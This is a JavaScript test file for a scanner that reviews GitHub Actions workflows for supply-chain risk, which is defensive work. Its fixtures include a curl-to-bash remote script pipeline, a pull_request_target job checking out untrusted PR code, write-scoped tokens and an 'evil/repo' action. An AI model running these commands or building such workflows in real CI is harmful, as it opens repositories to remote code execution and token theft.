'use strict';
const test=require('node:test'),assert=require('node:assert/strict'),fs=require('node:fs'),path=require('node:path');
const {reviewWorkflows}=require('./ultra_sentinel_supply_chain.cjs');
const SHA='a'.repeat(40),F='.github/workflows/ci.yml';
const scan=src=>reviewWorkflows({sha:SHA,expected:[F],sources:{[F]:src}});
const rules=s=>s.findings.map(f=>f.rule);
test('trusted SHA-pinned read-only workflow has no supply-chain alerts',()=>{
 const r=scan("on: pull_request\npermissions:\n  contents: read\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@"+'a'.repeat(40)+"\n");
 assert.equal(r.status,'NO_RISK_PATTERN');assert.equal(r.findings.length,0);assert.equal(r.coverage.partial,false);
});
test('unpinned external Actions are detected even if their comment claims v6',()=>{
 const r=scan('jobs:\n  x:\n    steps:\n      - uses: actions/checkout@v6 # SHA pinned\n');
 assert.ok(rules(r).includes('UNPINNED_ACTION'));assert.equal(r.findings[0].severity,'HIGH');
});
test('supply-chain source scanning catches untrusted checkout on existing privileged trigger',()=>{
 const r=scan("on:\n  pull_request_target:\n    types: [opened]\njobs:\n  scan:\n    steps:\n      - uses: actions/checkout@"+'a'.repeat(40)+
 "\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n");
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
 assert.equal(r.findings.find(x=>x.rule==='PRIVILEGED_PR_CODE_CHECKOUT').severity,'BLOCKER');
});
test('write-capable workflow triggers a human review finding, not a claim of exploitation',()=>{
 const r=scan('on: pull_request_target\npermissions:\n  contents: write\n  pull-requests: write\n');
 assert.ok(rules(r).includes('PRIVILEGED_WRITE_TOKEN'));assert.equal(r.status,'REVIEW_REQUIRED');
});
test('remote shell download pipeline is treated as risky, not executed',()=>{
 const r=scan('jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://x.invalid/script.sh | bash\n');
 assert.ok(rules(r).includes('REMOTE_SHELL_PIPELINE'));
});
test('missing requested workflow content cannot produce a clean report',()=>{
 const r=reviewWorkflows({sha:SHA,expected:[F],sources:{}});
 assert.equal(r.status,'INCOMPLETE');assert.equal(r.coverage.partial,true);
});
test('oversized workflow is rejected without analyzing a truncated fragment',()=>{
 const r=scan('x'.repeat(180000));
 assert.equal(r.status,'INCOMPLETE');assert.equal(r.coverage.partial,true);
});
test('unrelated code changes do not create fictitious evidence',()=>{
 const r=reviewWorkflows({sha:SHA,expected:[],sources:{}});
 assert.equal(r.status,'NOT_APPLICABLE');
});
test('invalid or traversal paths fail closed and no secrets leak into output',()=>{
 const r=reviewWorkflows({sha:SHA,expected:['.github/workflows/../private.yml'],sources:{}});
 assert.equal(r.status,'INCOMPLETE');
 const marker='SECRET_VALUE_DO_NOT_LEAK_666';
 const found=scan("jobs:\n  x:\n    steps:\n      - uses: evil/repo@v1 # "+marker+"\n");
 assert.ok(found.findings.length);assert.doesNotMatch(JSON.stringify(found),new RegExp(marker));
});
test('workflow integration takes exact immutable SHA, never exposes PR source to shell',()=>{
 const y=fs.readFileSync(path.resolve(__dirname,'../workflows/ultra-sentinel-auto-review.yml'),'utf8');
 assert.match(y,/ultra_sentinel_supply_chain\.cjs/);
 assert.match(y,/reviewWorkflows/);
 assert.match(y,/const supplyChain=reviewWorkflows/);
 assert.match(y,/ref:pr.head.sha/);
 assert.doesNotMatch(y,/contents: write|issues: write|pull-requests: write/);
});
